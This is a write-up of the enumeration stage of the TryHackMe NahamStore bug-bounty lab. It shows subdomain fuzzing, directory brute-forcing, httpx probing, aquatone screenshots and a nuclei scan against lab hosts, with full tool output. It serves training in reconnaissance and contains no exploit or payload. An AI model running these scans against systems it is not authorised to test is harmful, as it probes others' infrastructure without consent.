# NahamStore — Writeup

## Overview
### NahamStore — Writeup
### NahamStore — Writeup
-----
In this room you will learn the basics of bug bounty hunting and web application hacking
---
![](https://pbs.twimg.com/profile_banners/2281370629/1581917395/1500x500)
### NahamStore
Start Machine
NahamStore has been created to test what you've learnt with [NahamSec's](https://twitter.com/nahamsec) "Intro to Bug Bounty Hunting and Web Application Hacking" [Udemy Course](http://bugbounty.nahamsec.training/). Deploy the machine and once you've got an IP address move onto the next step!
Udemy Course created by [@NahamSec](https://twitter.com/NahamSec) | Labs created By [@adamtlangley](https://twitter.com/adamtlangley)
Answer the questions below
I have deployed the machine
Question Done
### Setup
To start the challenge you'll need to add an entry into your  /etc/hosts or c:\windows\system32\drivers\etc\hosts file pointing to your deployed TryHackMe box.
For Example:
`MACHINE_IP                  nahamstore.thm`
When enumerating subdomains you should perform it against the **nahamstore.com** domain. When you find a subdomain you'll need to add an entry into your /etc/hosts or c:\windows\system32\drivers\etc\hosts file pointing towards your deployed TryHackMe box IP address and substitute .com for .thm . For example if you discover the subdomain whatever.nahamstore.com you would add the following entry:
`MACHINE_IP          something.nahamstore.thm`
You'll now be able to view [http://something.nahamstore.thm](http://something.nahamstore.thm/) in your browser.
The tasks can be performed in any order but we suggest starting with subdomain enumeration.
Answer the questions below
I understand!
Correct Answer

## Enumeration
Using a combination of subdomain enumeration, brute force, content discovery and fuzzing find all the subdomains you can and answer the below questions.
Answer the questions below
```text
There are nice books to learn bug bounty
https://github.com/m0chan/BugBounty/blob/master/Bug%20Bounty%20Playbook.pdf
https://github.com/akr3ch/BugBountyBooks

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.3.2 something.nahamstore.thm

If you're reading this you need to add www.nahamstore.thm and nahamstore.thm to your hosts file pointing to something.nahamstore.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.3.2 something.nahamstore.thm www.nahamstore.thm nahamstore.thm

need more subdomains

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.nahamstore.thm" --hc 404 --hw 65
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nahamstore.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload          
=====================================================================

000000001:   301        7 L      13 W       194 Ch      "www"            
000000037:   301        7 L      13 W       194 Ch      "shop"           
000000254:   200        41 L     92 W       2025 Ch     "marketing"      
000000960:   200        0 L      1 W        67 Ch       "stock"   

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.3.2 something.nahamstore.thm www.nahamstore.thm nahamstore.thm shop.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://stock.nahamstore.thm/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/stock.nahamstore.thm/-_23-03-19_22-17-54.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-03-19_22-17-54.log

Target: http://stock.nahamstore.thm/

[22:17:55] Starting: 
[22:19:25] 200 -  148B  - /product

Task Completed

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 10 dir -e -k -u http://nahamstore.thm/ -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nahamstore.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://nahamstore.thm/basket               (Status: 200) [Size: 2465]
http://nahamstore.thm/css                  (Status: 301) [Size: 178] [--> http://127.0.0.1/css/]
http://nahamstore.thm/js                   (Status: 301) [Size: 178] [--> http://127.0.0.1/js/]
http://nahamstore.thm/login                (Status: 200) [Size: 3099]
http://nahamstore.thm/logout               (Status: 302) [Size: 0] [--> /]
http://nahamstore.thm/register             (Status: 200) [Size: 3138]
http://nahamstore.thm/returns              (Status: 200) [Size: 3628]
http://nahamstore.thm/robots.txt           (Status: 200) [Size: 13]
http://nahamstore.thm/search               (Status: 200) [Size: 3351]
http://nahamstore.thm/staff                (Status: 200) [Size: 2287]
http://nahamstore.thm/uploads              (Status: 301) [Size: 178] [--> http://127.0.0.1/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ knockpy nahamstore.thm  

  _  __                 _                
 | |/ /                | |   v6.1.0            
 | ' / _ __   ___   ___| | ___ __  _   _ 
 |  < | '_ \ / _ \ / __| |/ / '_ \| | | |
 | . \| | | | (_) | (__|   <| |_) | |_| |
 |_|\_\_| |_|\___/ \___|_|\_\ .__/ \__, |
                            | |     __/ |
                            |_|    |___/ 

local: 10757 | remote: 1 er.py                                                  

Wordlist: 10758 | Target: nahamstore.thm | Ip: 10.10.3.2 

02:25:56

Ip address      Code Subdomain                              Server                                 Real hostname
--------------- ---- -------------------------------------- -------------------------------------- --------------------------------------
                                   10.10.3.2            marketing.nahamstore.thm                                                      something.nahamstore.thm
                                   10.10.3.2       200  shop.nahamstore.thm                    nginx/1.14.0 (Ubuntu)                  something.nahamstore.thm
                                 10.10.3.2            stock.nahamstore.thm                                                          something.nahamstore.thm
                                  10.10.3.2       200  www.nahamstore.thm                     nginx/1.14.0 (Ubuntu)                  something.nahamstore.thm

Ip address: 1 | Subdomain: 4 | elapsed time: 00:10:38 

┌──(witty㉿kali)-[~/Downloads]
└─$ gau nahamstore.com
http://nahamstore.com/
http://nahamstore.com/
http://www.nahamstore.com/cdn-cgi/styles/main.css
http://nahamstore.com/robots.txt
https://nahamstore.com/robots.txt

──(witty㉿kali)-[~/bug_hunter/commoncrawl]
└─$ gobuster -t 10 dir -e -k -u http://marketing.nahamstore.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://marketing.nahamstore.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://marketing.nahamstore.thm/6e6055bd53afb9b6e4394d76e35838c9 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/cfa5301358b9fcbe7aa45b1ceea088c6 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/f05221fb72cfbc1b85256abe00683bc4 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/cdd9dc973c4bf6bc852564ca006418a0 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/64356135653039353435383166306330 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/c097c40d3f9a53ff5c7ddfc2f7f1c05c (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/64356135653039353435613034323230 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/64356135653039353435613034616530 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/64356135653039353435613033613530 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/63646263373534393435386631383830 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/d2813bb8eb6c17bf8725725a007ec859 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD010572CAEB316F4F (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD0106E01622BE22F7 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD010714BF3E1D9D73 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD01070597FACFABDF (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD010312E2BF5CDF8B (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DE010C8DB19BBD56DE (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DF0109B6637F89A9DC (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD01070598C94A075F (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/7a69ce99e2ba00f7335ae0a8ae644087 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/f188e102f7e4a96c1aac1d781ddde4ad (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/358af665e81625dbdde1fdc704cc9c38 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/07840a36009e0b55cec33bd718a6d207 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/27e3ba3741dc31a28a09732331c7e763 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/1b51a08359c4ccf44d9323bff9f57fe1 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/1cf5818ed6da7d2460b3ed5a86021d97 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/eeaf72df4f307cfc7d6f6e8190dda18e (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/ddb2efe64f5cd053fce1dcdba825143c (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/c55ccb753ee403d5b1846fc04775b5e1 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/7b830347c50b917ede192d4457e20e34 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/bff40e98d654a441fb4eb11e9ae5d328 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/BCE481855CDDB2A8C2256CF00046777F (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/A4A37C0775794E72C2256CE9003E8064 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/47fdd908b5d373b6ea372e41a6e64010 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/937389028f61b80ee528cc1c073e90cb (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/52c6800ecf94285c7cf287061c8de669 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/fbf033bb052b4c5ab2f9ed71b28a304c (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/766d856ef1a6b02f93d894415e6bfa0e (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/4dcf435435894a4d0972046fc566af76 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/55c567fd4395ecef6d936cf77b8d5b2b (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/754dda4b1ba34c6fa89716b85d68532b (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/77f959f119f4fb2321e9ce801e2f5163 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/db0b8ca4d31149e1c6354a10214cb047 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/5475CDA198B938FACA256CD40007BBD0 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/1D198D8F9BCCABC3CA256C53000E1E42 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/3dad25e101cb7a4c273fc3787a0a06ca (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/fb8fb1b65f7e25e3412568ce0052e511 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/6dee8c20b2de65004125692e00693585 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/fd2d7e98a7944cc080256985004ee3e1 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/F53ED6575AAFC611B55C7BA37E5B7BF7 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/13E3EFA17084BC52802569AC003C03B5 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/29f5f44b75a32efa8025692700438088 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/70d5215f9c6985a5c1256d650027dbf3 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/E0993A3E67EF8021C12570A8004F3817 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/10B1B6E747C29A71C12570A8004F2606 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/ce053af5a230d6e6fba69e83b538c0c3 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/24BF2BC7CA735EED4A256B4800162838 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/9c678349c6517f9b32afce91a4299ffc (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/dc25659fbeac0af10281af48b04244d1 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
Progress: 220560 / 220561 (100.00%)
===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ assetfinder -subs-only nahamstore.com
nahamstore.com
nahamstore-2020.nahamstore.com
marketing.nahamstore.com
stock.nahamstore.com
www.nahamstore.com
nahamstore.com
www.nahamstore.com
shop.nahamstore.com

1 subdomain more

┌──(witty㉿kali)-[~/bug_hunter/commoncrawl]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.3.2 something.nahamstore.thm www.nahamstore.thm nahamstore.thm shop.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm nahamstore-2020.nahamstore.thm

┌──(witty㉿kali)-[~/bug_hunter/commoncrawl]
└─$ dirsearch -u http://nahamstore-2020.nahamstore.thm/ -i200,302 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/nahamstore-2020.nahamstore.thm/-_23-03-20_00-55-46.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-03-20_00-55-46.log

Target: http://nahamstore-2020.nahamstore.thm/

[00:55:47] Starting: 

Task Completed

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ amass enum -brute -passive -d nahamstore.com | tee -a subdomains.txt
www.nahamstore.com
stock.nahamstore.com
shop.nahamstore.com
nahamstore-2020.nahamstore.com
nahamstore.com
marketing.nahamstore.com

The enumeration has finished
Discoveries are being migrated into the local database
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt 
www.nahamstore.com
stock.nahamstore.com
shop.nahamstore.com
nahamstore-2020.nahamstore.com
nahamstore.com
marketing.nahamstore.com

https://www.kali.org/tools/chromium/
https://medium.com/@sherlock297/install-aquatone-on-kali-linux-dd2a6850fd32
https://www.kali.org/tools/httpx-toolkit/

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt
www.nahamstore.thm
stock.nahamstore.thm
shop.nahamstore.thm
nahamstore-2020.nahamstore.thm
nahamstore.thm
marketing.nahamstore.thm
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt | httpx-toolkit 

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/              v1.1.5

		projectdiscovery.io

Use with caution. You are responsible for your actions.
Developers assume no liability and are not responsible for any misuse or damage.
http://www.nahamstore.thm
http://nahamstore-2020.nahamstore.thm
http://shop.nahamstore.thm
http://stock.nahamstore.thm
http://marketing.nahamstore.thm
http://nahamstore.thm

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt | httpx-toolkit -sc -title

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/              v1.1.5

		projectdiscovery.io

Use with caution. You are responsible for your actions.
Developers assume no liability and are not responsible for any misuse or damage.
http://www.nahamstore.thm [301] [301 Moved Permanently]
http://nahamstore-2020.nahamstore.thm [403] [403 Forbidden]
http://stock.nahamstore.thm [200] []
http://shop.nahamstore.thm [301] [301 Moved Permanently]
http://marketing.nahamstore.thm [200] [Marketing Manager - Active Campaigns]
http://nahamstore.thm [200] [NahamStore - Home]

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt | httpx-toolkit | tee -a alivesubdomains.txt

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/              v1.1.5

		projectdiscovery.io

Use with caution. You are responsible for your actions.
Developers assume no liability and are not responsible for any misuse or damage.
http://shop.nahamstore.thm
http://www.nahamstore.thm
http://stock.nahamstore.thm
http://nahamstore.thm
http://nahamstore-2020.nahamstore.thm
http://marketing.nahamstore.thm
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat alivesubdomains.txt                                        
http://shop.nahamstore.thm
http://www.nahamstore.thm
http://stock.nahamstore.thm
http://nahamstore.thm
http://nahamstore-2020.nahamstore.thm
http://marketing.nahamstore.thm

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat alivesubdomains.txt | aquatone 
aquatone v1.7.0 started at 2023-03-20T13:18:32-04:00

Targets    : 6
Threads    : 4
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://stock.nahamstore.thm: 200 OK
http://nahamstore-2020.nahamstore.thm: 403 Forbidden
http://marketing.nahamstore.thm: 200 OK
http://nahamstore.thm: 200 OK
http://shop.nahamstore.thm: 200 OK
http://www.nahamstore.thm: 200 OK
http://stock.nahamstore.thm: screenshot successful
http://nahamstore-2020.nahamstore.thm: screenshot successful
http://marketing.nahamstore.thm: screenshot successful
http://nahamstore.thm: screenshot successful
http://shop.nahamstore.thm: screenshot successful
http://www.nahamstore.thm: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2023-03-20T13:18:32-04:00
 - Finished at : 2023-03-20T13:18:46-04:00
 - Duration    : 13s

Requests:
 - Successful : 6
 - Failed     : 0

 - 2xx : 5
 - 3xx : 0
 - 4xx : 1
 - 5xx : 0

Screenshots:
 - Successful : 6
 - Failed     : 0

Wrote HTML report to: aquatone_report.html

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd screenshots                    
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ ls
http__marketing_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore-2020_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore_thm__da39a3ee5e6b4b0d.png
http__shop_nahamstore_thm__da39a3ee5e6b4b0d.png
http__stock_nahamstore_thm__da39a3ee5e6b4b0d.png
http__www_nahamstore_thm__da39a3ee5e6b4b0d.png
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ eog http__marketing_nahamstore_thm__da39a3ee5e6b4b0d.png

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat alivesubdomains.txt | nuclei

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.8.9

		projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully downloaded nuclei-templates (v9.4.0) to /home/witty/.local/nuclei-templates. GoodLuck!
[INF] Using Nuclei Engine 2.8.9 (outdated)
[INF] Using Nuclei Templates 9.4.0 (latest)
[INF] Templates added in last update: 65
[INF] Templates loaded for scan: 5703
[INF] Targets loaded for scan: 6
[INF] Templates clustered: 1035 (Reduced 5742 Requests)
[tech-detect:nginx] [http] [info] http://www.nahamstore.thm
[nginx-version] [http] [info] http://marketing.nahamstore.thm [nginx/1.14.0]
[nginx-version] [http] [info] http://stock.nahamstore.thm [nginx/1.14.0]
[tech-detect:nginx] [http] [info] http://nahamstore-2020.nahamstore.thm
[tech-detect:nginx] [http] [info] http://stock.nahamstore.thm
[nginx-version] [http] [info] http://nahamstore.thm [nginx/1.14.0]
[tech-detect:bootstrap] [http] [info] http://marketing.nahamstore.thm
[tech-detect:nginx] [http] [info] http://marketing.nahamstore.thm
[tech-detect:nginx] [http] [info] http://shop.nahamstore.thm
[tech-detect:bootstrap] [http] [info] http://nahamstore.thm
[tech-detect:nginx] [http] [info] http://nahamstore.thm
[INF] Using Interactsh Server: oast.online
[http-missing-security-headers:content-security-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-max-age] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-max-age] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:content-security-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-max-age] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:content-security-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://nahamstore.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://nahamstore.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://nahamstore.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-max-age] [http] [info] http://nahamstore.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://nahamstore.thm
